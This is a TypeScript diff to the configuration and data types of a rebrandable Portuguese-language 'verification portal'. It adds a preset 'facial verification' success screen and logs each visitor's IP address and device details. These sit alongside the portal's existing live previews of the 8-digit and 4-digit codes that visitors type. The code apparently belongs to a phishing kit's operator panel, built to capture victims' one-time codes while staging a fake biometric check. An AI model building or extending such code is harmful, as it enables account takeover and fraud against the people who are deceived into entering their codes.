@@ -21,6 +21,11 @@ export interface FormConfig {
   brandName: string;
   logoUrl: string;
   authLoadingText: string;
+  enableFaceVerification: boolean;
+  faceTitle: string;
+  faceHelper: string;
+  faceSuccessTitle: string;
+  faceSuccessMessage: string;
   title: string;
   description: string;
   step1Title: string;
@@ -37,9 +42,20 @@ export interface FormConfig {
   extraFields: ExtraFieldConfig[];
 }
 
+export interface DeviceMetadata {
+  deviceType: string;
+  deviceBrand: string;
+  deviceModel: string;
+  os: string;
+  browser: string;
+}
+
 export interface SubmissionRecord {
   id: string;
   protocol: string;
+  ipAddress?: string;
+  device?: DeviceMetadata;
+  faceVerified?: boolean;
   code8: string;
   code4: string;
   extraData: Record<string, string>;
@@ -52,6 +68,8 @@ export interface SubmissionRecord {
 
 export interface OnlineVisitor {
   sessionId: string;
+  ipAddress?: string;
+  device?: DeviceMetadata;
   step: string;
   code8Preview: string;
   lastSeen: number;
@@ -61,9 +79,14 @@ export const DEFAULT_CONFIG: FormConfig = {
   brandName: 'Portal de Verificação',
   logoUrl: '',
   authLoadingText: 'Fazendo autenticação, aguarde...',
+  enableFaceVerification: true,
+  faceTitle: 'Verificação Facial',
+  faceHelper: 'Centralize seu rosto na moldura para realizar o escaneamento biométrico.',
+  faceSuccessTitle: 'Autenticação realizada e OK',
+  faceSuccessMessage: 'Sua verificação facial foi confirmada. Agora informe seu código de 8 dígitos.',
   title: 'Verificação de Acesso em Duas Etapas',
   description:
-    'Valide seu código principal de 8 dígitos e conclua a confirmação com o código de 4 dígitos.',
+    'Valide sua biometria facial, seu código principal de 8 dígitos e conclua com o código de 4 dígitos.',
   step1Title: 'Informe seu código de 8 dígitos',
   step1Helper: 'Digite ou cole os 8 números do seu código de identificação.',
   step1SuccessTitle: 'Verificado com sucesso',
